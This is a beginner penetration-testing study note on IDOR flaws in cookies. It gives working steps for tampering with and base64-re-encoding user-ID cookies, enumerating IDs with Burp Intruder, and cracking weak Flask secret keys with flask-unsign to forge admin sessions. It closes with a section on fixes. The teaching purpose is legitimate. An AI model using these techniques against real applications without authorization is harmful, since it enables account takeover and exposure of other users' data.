---
tags: [vapt, access-control, idor, beginner]
difficulty: beginner
module: "21 - Access Control"
topic: "21.06 IDOR in Cookies"
---

# 21.06 — IDOR in Cookies

## Cookie-Based Object References

```
SOME APPS STORE USER/OBJECT IDs IN COOKIES:
  Cookie: user_id=42
  Cookie: account=ACC-001
  Cookie: role=user; user_id=42
  
  IF SERVER USES COOKIE VALUE AS-IS TO FETCH DATA:
  → Modify cookie → access different user's data!
  
  WHY COOKIES FOR IDS?
  Legacy apps: no server-side sessions, store state in cookies
  Stateless APIs: use cookie as lightweight user identifier
  Tracking: per-user content without full session
  
  DIFFERENCE FROM SESSION COOKIES:
  Session cookie: opaque identifier → server looks up data internally
  Direct ID cookie: the actual database ID → IDOR risk!
```

---

## Common Cookie IDOR Patterns

```
PATTERN 1: User ID in cookie
  Cookie: userId=42
  → Change to userId=1 → admin's data?
  
PATTERN 2: Account/tenant identifier
  Cookie: account_id=TENANT-001
  → Change to account_id=TENANT-002 → different org's data!

PATTERN 3: Encoded user ID
  Cookie: user=NDI=  (base64 of "42")
  → Decode: echo "NDI=" | base64 -d → 42
  → Change to: echo -n "1" | base64 → MQ==
  → Set Cookie: user=MQ==

PATTERN 4: Hashed but predictable
  Cookie: user_hash=6b86b273...  (SHA256 of "1")
  → Pre-compute hashes for small integers:
  python3 -c "import hashlib; print(hashlib.sha256(b'1').hexdigest())"
  → Try: user_hash=SHA256("1") → admin account!

PATTERN 5: Signed but verifiable
  Cookie: user_id=42|HMAC-SHA256(secret, "42")
  → If secret is weak → crack HMAC → forge for user_id=1!
  → If secret found in source code → forge any user_id!
```

---

## Finding and Testing Cookie IDOR

```bash
# STEP 1: INSPECT ALL COOKIES
# In Burp: Cookie header in Proxy History
# In Browser: DevTools → Application → Cookies
# In Burp: Repeater → right-click → Show response in browser

# LOOK FOR:
# - Numeric values: user_id=42, account=1001
# - Base64-encoded: dXNlcl9pZD00Mg==
# - Sequential patterns
# - References to DB-style IDs

# STEP 2: DECODE ANY ENCODED VALUES:
echo "NDI=" | base64 -d           # base64
python3 -c "import urllib.parse; print(urllib.parse.unquote('user%3D42'))"  # URL encoded
python3 -c "import json,base64; print(json.loads(base64.b64decode('..')))"  # JWT/JSON

# STEP 3: MODIFY THE COOKIE:
# Burp: Intercept → find request → modify Cookie header
# Change: user_id=42 → user_id=1
# Or: base64 decode → change → re-encode → replace

# STEP 4: OBSERVE RESPONSE:
# Different user's data? → COOKIE IDOR!
# Error or same data? → Server validates or uses session

# STEP 5: ENUMERATE IDs:
# Send to Intruder:
# Cookie: user_id=§42§
# Payload: Numbers 1-100
# Filter by response length or status code

# DECODE COOKIE AUTOMATION:
python3 << 'EOF'
import base64
import json

# Test base64-encoded cookie:
cookie_value = "dXNlcl9pZD00Mg=="
decoded = base64.b64decode(cookie_value).decode()
print(f"Decoded: {decoded}")

# Try to parse as JSON:
try:
    obj = json.loads(decoded)
    print(f"JSON: {obj}")
except:
    print("Not JSON")

# Try numeric:
try:
    num = int(decoded)
    print(f"Numeric ID: {num}")
    # Re-encode with different ID:
    new_id = "1"
    new_encoded = base64.b64encode(new_id.encode()).decode()
    print(f"New cookie value (id=1): {new_encoded}")
except:
    pass
EOF
```

---

## IDOR via Signed Cookies (Flask, Django)

```
FLASK SECRET_KEY WEAKNESS:
  Flask signs cookies with SECRET_KEY
  If SECRET_KEY is weak or leaked → forge any cookie value!
  
  EXAMPLE:
  Cookie: session=eyJ1c2VyX2lkIjogNDJ9.SIGNATURE
  
  If Flask secret key is "secret" or "dev" etc.:
  
  # Crack with flask-unsign:
  pip install flask-unsign
  
  flask-unsign --unsign --cookie "eyJ1c2VyX2lkIjogNDJ9.SIGNATURE"
  # → Tries common secrets
  
  flask-unsign --unsign --cookie "COOKIE_VALUE" --wordlist rockyou.txt
  # → Dictionary attack
  
  # After cracking:
  flask-unsign --sign --secret "found_secret" --cookie '{"user_id": 1}'
  # → Get admin session cookie!

DJANGO SESSION SIGNING:
  Similar: SECRET_KEY signs session data
  If key weak → forge admin session!
```

---

## Fix

```
PROPER COOKIE DESIGN:

NEVER USE DATABASE IDs DIRECTLY IN COOKIES:
  BAD:  Cookie: user_id=42  (directly the DB ID)
  GOOD: Cookie: session=RANDOM_OPAQUE_TOKEN  → server looks up user_id internally!
  
SESSIONS ARE THE CORRECT PATTERN:
  session_id → server-side lookup → user_id
  
  Cookie stores: opaque, long random token (32+ bytes)
  Server stores: token → user_id mapping (in DB or Redis)
  
  Even if attacker guesses "token=43" → it's not a valid session!
  
# Python Flask — use sessions correctly:
from flask import session
import secrets

@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        session['user_id'] = user.id  # Flask signs session cookie with SECRET_KEY
        # → Cookie looks random, user_id is protected
    return redirect('/dashboard')

# STRONG SECRET_KEY (must be random and long!):
app.secret_key = secrets.token_hex(32)  # 64 random hex chars
# NEVER: app.secret_key = "secret" or "dev"!

IF YOU MUST INCLUDE IDS IN COOKIES:
  Use signed/encrypted cookies with strong secret
  Validate signature on every request
  Use cryptographically secure HMAC:
  Cookie: user_id=42|HMAC-SHA256(RANDOM_SECRET_32BYTES, "42")
```

---

## Related Notes
- [[03 - IDOR — Insecure Direct Object Reference]] — IDOR overview
- [[05 - IDOR in POST Body]] — body-based IDOR
- [[07 - IDOR in HTTP Headers]] — header-based IDOR
- [[17 - Session Management — JWT Signed Cookies]] — signed cookie security
- [[20 - Defense — Server-Side Authorization, Object-Level Checks]] — full fix
